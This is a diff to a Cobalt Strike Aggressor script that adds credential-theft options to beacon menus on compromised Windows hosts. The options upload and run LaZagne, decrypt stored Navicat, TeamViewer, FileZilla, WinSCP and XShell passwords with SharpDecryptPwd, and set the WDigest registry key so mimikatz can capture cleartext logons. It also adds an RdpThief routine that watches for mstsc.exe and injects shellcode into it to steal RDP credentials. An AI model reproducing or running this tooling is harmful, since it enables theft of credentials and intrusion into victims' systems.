@@ -64,11 +64,27 @@ popup beacon_bottom {
                    navicat_password($bid);
             }
     	}
-    	item "LaZagne"{
-    		local('$bid');
-               foreach $bid ($1){
-                   lazagne_password($bid);
-            }
+    	menu "LaZagne"{
+    		item "upload lazagne"{
+        	local('$bid');
+        	foreach $bid ($1){
+            bupload($1, "script/lazagne.exe");
+        		}
+        	}
+        	item "LaZagne" {
+			$bid = $1['@'];
+			$dialog = dialog("LaZagne", %(args => "",bid => $bid), &lazagne_password);
+			drow_text($dialog, "args", "args:  ");
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        	}
+        	item "del lazagne"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q lazagne.exe");
+        	}
+		}
+
     	}
     	item "Internal-Monologue"{
     		local('$bid');
@@ -76,6 +92,49 @@ popup beacon_bottom {
                    internal_monologue($bid);
             }
     	}
+    	menu "DecryptPwd" {
+        
+		item "DecryptPwd" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &Sharp_DecryptPwd);
+			drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla", "-WinSCP"));
+            dbutton_action($dialog, "Chong!!!");
+			dialog_show($dialog);
+        }
+		item "DecryptXShell" {
+			$bid = $1['@'];
+			$dialog = dialog("DecryptXShell", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Decrypt_XShell);
+			dialog_description($dialog, "DecryptXShell");
+			drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
+			drow_text($dialog, "path", "Sessions Path:  ");
+            dbutton_action($dialog, "Chong!!!");
+			dialog_show($dialog);
+        }
+		
+    	}
+    	menu "win 2012_mimikatz" {
+		item "edit_reg" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+        }
+		}
+        }
+        menu "RdpThief"{
+        item "Rdpthief_Enable"{
+            blog($1, "RdpThief enabled \n");
+            add(@beacons,$1,0);
+        }
+
+        item "Rdpthief_Disable"{
+            blog($1, "Disabling RdpThief");
+            remove(@beacons,$1);
+        }
+
+        item "Rdpthief_Dump"{
+            bshell($1,"type %temp%\\data.bin");
+        }
+    }
     }
 }
 sub mimikatz_bdcsync{
@@ -176,16 +235,8 @@ sub navicat_password{
 	bexecute_assembly($1, $binary);
 }
 sub lazagne_password{
-	$binary = "script/lazagne.exe";
-	$help = "The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer";
-	beacon_command_register("lazagne", $help, "The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer\n\n$help");
-	if(!-exists $binary)
-	{
-		berror($1, "lazagne binary cannot be found at $binary");
-		return;
-	}
-	bupload($1, $binary);
-	brun($1, "lazagne.exe all");
+	$arg = join(' ', @($3['args']));
+	bshell($bid, "lazagne.exe $arg");
 }
 sub internal_monologue{
 	$binary = "script/InternalMonologue.exe";
@@ -198,4 +249,43 @@ sub internal_monologue{
 	}
 	$args = "-Downgrade True -Verbose True";
 	bexecute_assembly($1, $binary, $args);
+}
+sub Sharp_DecryptPwd {
+	
+		bexecute_assembly($bid, script_resource("script/SharpDecryptPwd.exe"), $3['type']);
+	
+}
+sub Decrypt_XShell {
+		$arg = join(' ', @($3['type'],"-p",$3['path']));
+		bexecute_assembly($bid, script_resource("script/SharpDecryptPwd.exe"), $arg);
+}
+@beacons = @();
+@pids = @();
+
+on heartbeat_5s{
+
+		foreach $index => $beaconid (@beacons)
+		{
+		   
+		    bps($beaconid,&handleProcess);
+		}	
+
+}
+sub handleProcess{
+	
+	$processList = $2;
+	$index = indexOf($processList, "mstsc.exe", 0) + 9;
+
+	if($index > 9){
+
+		$temp = substr($processList,$index,-1);
+		$pid = split("\t",$temp)[2];
+
+		if ($pid !in @pids){
+			add(@pids,$pid,0);
+			blog($1,"Injecting into mstsc.exe with PID: $pid");
+			bshinject($1, $pid , "x64" ,script_resource("script/RdpThief_x64.tmp"));
+		}
+		
+	}
 }
